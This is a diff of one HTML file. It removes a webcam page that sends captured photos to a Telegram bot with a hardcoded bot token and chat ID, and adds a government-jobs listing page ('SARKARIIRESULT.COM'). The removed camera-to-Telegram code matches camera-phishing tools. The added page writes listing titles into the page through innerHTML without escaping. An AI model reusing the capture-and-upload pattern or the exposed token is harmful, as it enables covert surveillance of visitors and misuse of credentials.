@@ -1,1 +1,122 @@
-<p>&lt;!DOCTYPE html&gt;</p><p>&lt;html lang="en"&gt;</p><p>&lt;head&gt;</p><p>  &lt;meta charset="UTF-8"&gt;</p><p>  &lt;title&gt;Live Camera Capture&lt;/title&gt;</p><p>  &lt;style&gt;</p><p>    body {</p><p>      font-family: sans-serif;</p><p>      text-align: center;</p><p>      background: #1a1a1a;</p><p>      color: white;</p><p>    }</p><p>    video, canvas {</p><p>      margin-top: 20px;</p><p>      border: 2px solid #ccc;</p><p>      border-radius: 10px;</p><p>    }</p><p>    button {</p><p>      margin-top: 20px;</p><p>      padding: 10px 20px;</p><p>      font-size: 18px;</p><p>      cursor: pointer;</p><p>    }</p><p>  &lt;/style&gt;</p><p>&lt;/head&gt;</p><p>&lt;body&gt;</p><p>  &lt;h1&gt;Live Camera to Telegram&lt;/h1&gt;</p><p>  &lt;video id="video" width="320" height="240" autoplay&gt;&lt;/video&gt;&lt;br&gt;</p><p>  &lt;button onclick="captureAndSend()"&gt;Capture &amp; Send to Telegram&lt;/button&gt;</p><p>  &lt;canvas id="canvas" width="320" height="240" style="display: none;"&gt;&lt;/canvas&gt;</p><p><br></p><p>  &lt;script&gt;</p><p>    const video = document.getElementById('video');</p><p>    const canvas = document.getElementById('canvas');</p><p>    const context = canvas.getContext('2d');</p><p><br></p><p>    // Start camera stream</p><p>    navigator.mediaDevices.getUserMedia({ video: true })</p><p>      .then(stream =&gt; {</p><p>        video.srcObject = stream;</p><p>      })</p><p>      .catch(error =&gt; {</p><p>        alert("Camera access denied or not supported.");</p><p>        console.error(error);</p><p>      });</p><p><br></p><p>    function captureAndSend() {</p><p>      context.drawImage(video, 0, 0, canvas.width, canvas.height);</p><p>      canvas.toBlob(blob =&gt; {</p><p>        const formData = new FormData();</p><p>        formData.append('chat_id', '7430525822'); // Your Chat ID</p><p>        formData.append('photo', blob, 'capture.jpg');</p><p><br></p><p>        fetch(`https://api.telegram.org/bot8341564010:AAGbmOK0aGXFrEvCIBxmrlD8pAYqVhLiX0/sendPhoto`, {</p><p>          method: 'POST',</p><p>          body: formData</p><p>        })</p><p>        .then(response =&gt; {</p><p>          if (response.ok) {</p><p>            alert("📷 Photo sent to Telegram!");</p><p>          } else {</p><p>            alert("❌ Failed to send photo");</p><p>          }</p><p>        })</p><p>        .catch(error =&gt; {</p><p>          console.error('Error sending photo:', error);</p><p>        });</p><p>      }, 'image/jpeg');</p><p>    }</p><p>  &lt;/script&gt;</p><p>&lt;/body&gt;</p><p>&lt;/html&gt;</p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SARKARIIRESULT.COM — Govt Updates</title>
+  <meta name="description" content="Government Jobs • Results • Admit Cards • Schemes • Daily Documents" />
+  <style>
+    :root{
+      --bg:#0f172a; --card:#0b1220; --muted:#94a3b8; --text:#e2e8f0; --ring:#334155; --accent:#22c55e;
+      --orange:#ff7a00; --white:#ffffff; --green:#1faa59;
+    }
+    *{box-sizing:border-box}
+    html,body{margin:0;padding:0;background:var(--bg);color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Noto Sans",sans-serif}
+    a{color:#93c5fd;text-decoration:none}
+    a:hover{text-decoration:underline}
+    .wrap{max-width:1150px;margin:auto;padding:16px}
+    .banner{display:flex;align-items:center;gap:16px;border-radius:16px;overflow:hidden;margin:8px 0 16px;box-shadow:0 10px 30px rgba(0,0,0,.25);position:relative}
+    .flag{display:flex;height:72px;flex:1;min-width:260px}
+    .flag > div{flex:1}
+    .flag .o{background:var(--orange)} .flag .w{background:var(--white)} .flag .g{background:var(--green)}
+    .brand{position:absolute;width:100%;text-align:center;font-weight:900;font-size:clamp(18px,4vw,30px);letter-spacing:.5px;color:#0b1220;mix-blend-mode:luminosity}
+    .subtitle{margin-top:6px;font-size:14px;color:#cbd5e1;text-align:center}
+    .badge{background:rgba(255,255,255,.06);border:1px solid var(--ring);padding:6px 10px;border-radius:999px;font-size:12px;margin-left:auto}
+    .grid{display:grid;gap:16px;grid-template-columns: repeat(12, 1fr);margin-top:14px}
+    .col-4{grid-column: span 4}
+    @media (max-width: 900px){ .col-4{grid-column: span 6} }
+    @media (max-width: 640px){ .grid{grid-template-columns: repeat(1, 1fr)} .col-4{grid-column:auto} }
+    .card{background:linear-gradient(180deg, rgba(255,255,255,.03), rgba(255,255,255,.01));border:1px solid var(--ring);border-radius:16px;padding:14px 14px 8px;box-shadow:0 6px 20px rgba(0,0,0,.22)}
+    .head{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+    .dot{width:10px;height:10px;border-radius:50%;background:var(--accent)}
+    .title{font-weight:800;letter-spacing:.3px}
+    .list{list-style:none;margin:8px 0 8px;padding:0;max-height:420px;overflow:auto}
+    .list li{display:flex;gap:8px;padding:8px;border-radius:10px;align-items:flex-start}
+    .list li:hover{background:rgba(255,255,255,.04)}
+    .tag{font-size:11px;border:1px solid var(--ring);padding:2px 6px;border-radius:999px;color:var(--muted);white-space:nowrap}
+    .item{display:flex;flex-direction:column;gap:4px;flex:1}
+    .item .t{font-weight:700}
+    .meta{font-size:12px;color:var(--muted)}
+    .search{margin:8px 0 16px;display:flex;gap:8px}
+    .search input{flex:1;padding:10px 12px;border-radius:12px;border:1px solid var(--ring);background:#0b1220;color:var(--text)}
+    .search button{padding:10px 14px;border-radius:12px;border:1px solid var(--ring);background:#101a32;color:var(--text);cursor:pointer}
+    .footer{margin:20px 0 8px;text-align:center;color:var(--muted);font-size:13px}
+    .hidden{display:none}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="banner" aria-label="Site banner">
+      <div class="flag"><div class="o"></div><div class="w"></div><div class="g"></div></div>
+      <div class="brand">SARKARIIRESULT.COM</div>
+    </div>
+    <div class="subtitle">Government Jobs • Results • Admit Cards • Schemes • Daily Documents (Official links only)</div>
+
+    <div class="search">
+      <input id="q" placeholder="Search (e.g., SSC, UPSC, Police, Admit Card)">
+      <button onclick="doSearch()">Search</button>
+      <button onclick="resetSearch()">Reset</button>
+      <span class="badge" id="lastUpdate"></span>
+    </div>
+
+    <div class="grid">
+      <section class="card col-4"><div class="head"><span class="dot"></span><div class="title">Results</div></div><ul class="list" id="list-results"></ul></section>
+      <section class="card col-4"><div class="head"><span class="dot"></span><div class="title">Admit Card</div></div><ul class="list" id="list-admit"></ul></section>
+      <section class="card col-4"><div class="head"><span class="dot"></span><div class="title">Latest Jobs</div></div><ul class="list" id="list-jobs"></ul></section>
+      <section class="card col-4"><div class="head"><span class="dot"></span><div class="title">Latest Govt Schemes</div></div><ul class="list" id="list-schemes"></ul></section>
+      <section class="card col-4"><div class="head"><span class="dot"></span><div class="title">Daily Life</div></div><ul class="list" id="list-daily"></ul></section>
+      <section class="card col-4"><div class="head"><span class="dot"></span><div class="title">All Other Documents</div></div><ul class="list" id="list-docs"></ul></section>
+    </div>
+
+    <div class="footer">
+      © <span id="yr"></span> SARKARIIRESULT.COM • No ads • Only official links.
+      <br/>Disclaimer: We do not copy other websites’ content. Always verify details from official notification PDF.
+    </div>
+  </div>
+
+  <script src="data.js"></script>
+  <script>
+    const map = {
+      results: document.getElementById('list-results'),
+      admit:   document.getElementById('list-admit'),
+      jobs:    document.getElementById('list-jobs'),
+      schemes: document.getElementById('list-schemes'),
+      daily:   document.getElementById('list-daily'),
+      docs:    document.getElementById('list-docs'),
+    };
+    function makeItem(it){
+      const li=document.createElement('li');
+      li.innerHTML = `
+        <div class="item">
+          <a class="t" href="details.html?id=${encodeURIComponent(it.id)}" rel="noopener">${it.title}</a>
+          <div class="meta">${it.org || ''} ${it.date? ' • '+it.date:''}</div>
+        </div>
+        ${it.tag?`<span class="tag">${it.tag}</span>`:''}
+      `;
+      return li;
+    }
+    function render(){
+      ['results','admit','jobs','schemes','daily','docs'].forEach(k=>{
+        map[k].innerHTML='';
+        (DATA[k]||[]).forEach(it=>map[k].appendChild(makeItem(it)));
+      });
+      document.getElementById('lastUpdate').textContent = "Updated: " + new Date(DATA.updatedAt||Date.now()).toLocaleString();
+      document.getElementById('yr').textContent = new Date().getFullYear();
+    }
+    function doSearch(){
+      const q = document.getElementById('q').value.trim().toLowerCase();
+      document.querySelectorAll('.list').forEach(ul=>{
+        Array.from(ul.children).forEach(li=>{
+          const txt = li.querySelector('.t').textContent.toLowerCase();
+          li.classList.toggle('hidden', q && !txt.includes(q));
+        });
+      });
+    }
+    function resetSearch(){
+      document.getElementById('q').value='';
+      document.querySelectorAll('.list .hidden').forEach(el=>el.classList.remove('hidden'));
+    }
+    render();
+  </script>
+</body>
+</html>
